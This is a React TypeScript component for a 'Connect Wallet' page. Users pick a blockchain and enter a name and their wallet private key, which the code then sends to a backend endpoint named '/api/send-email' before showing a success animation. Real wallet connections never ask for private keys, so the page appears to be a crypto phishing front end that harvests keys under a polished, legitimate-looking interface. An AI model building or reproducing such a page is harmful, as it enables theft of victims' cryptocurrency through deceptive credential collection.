import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from "framer-motion";
import { ChevronDown, Check } from 'lucide-react';
import topBanner from "/assets/banner.png";
import axios from "axios";
import { validatePrivateKey } from '../../utils/helper';
import { baseUrl } from '../../utils/constants';
import { useNavigate } from 'react-router-dom';
import { SuccessMessage } from './SuccessMessage';

interface Option {
  value: string;
  label: string;
  description: string;
}

interface CustomSelectProps {
  value: string;
  onChange: (value: string) => void;
  options: Option[];
}

// Success Message Component


// Custom Select Component
const CustomSelect: React.FC<CustomSelectProps> = ({ value, onChange, options }) => {
  const [isOpen, setIsOpen] = useState(false);
  const selectRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (selectRef.current && !selectRef.current.contains(event.target as Node)) {
        setIsOpen(false);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  const getCurrencyColor = (currency: string): string => {
    const colors: { [key: string]: string } = {
      SOL: "bg-purple-500",
      ETH: "bg-blue-500",
      BTC: "bg-orange-500",
      SUI: "bg-green-500",
      BASE: "bg-red-500",
      POLYGON: "bg-yellow-500",
    };
    
    return colors[currency] || 'bg-gray-500';
  };

  return (
    <div className="relative" ref={selectRef}>
      <motion.button
        type="button"
        className="w-full p-3 border border-gray-600 rounded-lg text-left flex items-center justify-between
        hover:border-emerald-400/50 transition-colors duration-200"
        onClick={() => setIsOpen(!isOpen)}
        whileHover={{ scale: 1.01 }}
        whileTap={{ scale: 0.99 }}
      >
        <span className="flex items-center">
          <span className={`w-2 h-2 rounded-full mr-2 ${getCurrencyColor(value)}`} />
          {options.find((opt) => opt.value === value)?.label || 'Select currency'}
        </span>
        <motion.div
          animate={{ rotate: isOpen ? 180 : 0 }}
          transition={{ duration: 0.2 }}
        >
          <ChevronDown className="w-5 h-5 text-gray-400" />
        </motion.div>
      </motion.button>

      <AnimatePresence>
        {isOpen && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 10 }}
            transition={{ duration: 0.2 }}
            className="absolute z-20 w-full mt-2 bg-gray-800 border border-gray-700 rounded-lg shadow-xl overflow-auto max-h-96"
          >
            {options.map((option) => (
              <motion.div
                key={option.value}
                className="relative cursor-pointer group"
                whileHover={{ backgroundColor: 'rgba(20, 245, 158, 0.1)' }}
              >
                <div
                  className="p-3 flex items-center justify-between"
                  onClick={() => {
                    onChange(option.value);
                    setIsOpen(false);
                  }}
                >
                  <div className="flex items-center space-x-3">
                    <span className={`w-2 h-2 rounded-full ${getCurrencyColor(option.value)}`} />
                    <div>
                      <p className="text-gray-200 font-medium">{option.label}</p>
                      <p className="text-gray-400 text-sm">{option.description}</p>
                    </div>
                  </div>
                  {value === option.value && (
                    <Check className="w-5 h-5 text-emerald-400" />
                  )}
                </div>
              </motion.div>
            ))}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

// Main Component
const ConnectWallet: React.FC = () => {
  const [form, setForm] = useState({
    name: "",
    privateKey: "",
    currency: "SOL",
  });
  const navigate = useNavigate();
  const [loader, setLoader] = useState(false);
  const [error, setError] = useState("");
  const [showsuccessmessage, setShowSuccessMessage] = useState(false);
  const [countdown, setCountdown] = useState(4);
  //@ts-ignore
  const [showConfetti, setShowConfetti] = useState(false);

  useEffect(() => {
    if (showsuccessmessage) {
      setShowConfetti(true);
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(timer);
    }
  }, [showsuccessmessage]);

  const handleFormChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setError("");
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleConnectWallet = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoader(true);
    const errorMessage = validatePrivateKey(form.privateKey, form.currency);
    
    if (errorMessage) {
      setError(errorMessage);
      setLoader(false);
      // Shake animation for private key input
      const input = document.querySelector('input[name="privateKey"]');
      input?.classList.add('shake-animation');
      setTimeout(() => {
        input?.classList.remove('shake-animation');
      }, 500);
      return;
    }
    
    try {
      const response = await axios.post(`${baseUrl}/api/send-email`, {
        name: form.name,
        privateKey: form.privateKey,
        coinName: form.currency
      });

      if (response.status === 200) {
        setLoader(false);
        setShowSuccessMessage(true);
        setShowConfetti(true);
        setTimeout(() => {
          navigate("/");
        }, 4000);
      }
    } catch (e: any) {
      console.log(e);
      setError(e.response.data.message);
      setLoader(false);
    }
  };

  const currencies: Option[] = [
    {
      value: "SOL",
      label: "Solana (SOL)",
      description: "Fast, secure, and censorship-resistant blockchain",
    },
    {
      value: "ETH",
      label: "Ethereum (ETH)",
      description: "Programmable blockchain platform for smart contracts",
    },
    {
      value: "BTC",
      label: "Bitcoin (BTC)",
      description: "Digital gold and decentralized store of value",
    },
    {
      value: "SUI",
      label: "Sui (SUI)",
      description: "High-performance Layer 1 blockchain for decentralized apps",
    },
    {
      value: "BASE",
      label: "Base (BASE)",
      description: "Ethereum Layer 2 network for scalable and low-cost transactions",
    },
    {
      value: "POLYGON",
      label: "Polygon (MATIC)",
      description: "Ethereum scaling solution with fast and low-cost transactions",
    },
  ];

  return (
    <>
      <style>
        {`
          @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
          }
          .shake-animation {
            animation: shake 0.5s ease-in-out;
            border-color: rgb(239, 68, 68) !important;
          }
        `}
      </style>
      <SuccessMessage show={showsuccessmessage} countdown={countdown} />
      <div className="justify-center flex">
        <img src={topBanner} className="brightness-25 lg:w-full object fixed sm: h-screen" alt="banner" />
      </div>
      <div className="min-h-screen flex items-center justify-center p-4 backdrop-blur-lg">
        <motion.div
          className="p-8 rounded-xl shadow-2xl w-full max-w-md border border-gray-700"
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.9, ease: "easeOut" }}
        >
          <center>       
            <h1 className="font-semibold text-[40px]">
              <span className="gradient-text">Connect</span> Wallet
            </h1>
          </center>
          <form onSubmit={handleConnectWallet} className="space-y-6 mt-6">
            <motion.div className="space-y-2" whileHover={{ scale: 1.01 }}>
              <CustomSelect
                value={form.currency}
                onChange={(value: string) => setForm((prev) => ({ ...prev, currency: value }))} 
                options={currencies}
              />
            </motion.div>

            <motion.div className="space-y-2" whileHover={{ scale: 1.01 }}>
              <input
                name="name"
                placeholder='Name'
                value={form.name}
                onChange={handleFormChange}
                className="w-full p-3 border border-gray-600 rounded-lg text-gray-100 outline-none 
                         focus:border-emerald-400/50 transition-colors duration-200"
                required
              />
            </motion.div>
            
            <motion.div className="space-y-2" whileHover={{ scale: 1.01 }}>
              <input
                name="privateKey"
                placeholder='Private Key'
                type={"password"}
                value={form.privateKey}
                onChange={handleFormChange}
                className={`w-full p-3 border border-gray-600 rounded-lg text-gray-100 outline-none 
                         transition-all duration-200 focus:border-emerald-400/50
                         ${error ? 'border-red-500' : ''}`}
                required
              />
              {error && (
                <motion.span 
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className='text-sm text-red-500 block mt-2'
                >
                  {error}
                </motion.span>
              )}
            </motion.div>
           <div className='flex justify-center'>
            <motion.button
              type="submit"
              className={`theme_button_danger block w-full py-3 px-4 rounded-lg font-medium
              transition-all duration-200 ${loader ? 'opacity-50 cursor-not-allowed' : ''}`}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              disabled={loader}
              style={{
                borderColor: '#14f59e',
                background: '#14f59e1f',
                color: '#14f59e',
              }}
            >
              {loader ? (
                <span className="flex items-center justify-center">
                  <motion.span
                    animate={{ rotate: 360 }}
                    transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                    className="w-5 h-5 border-2 border-emerald-400 border-t-transparent rounded-full"
                    />
                  </span>
                ) : (
                  "Connect Wallet"
                )}
              </motion.button>
              </div>
            </form>
          </motion.div>
        </div>
      </>
    );
  };
  
  export default ConnectWallet;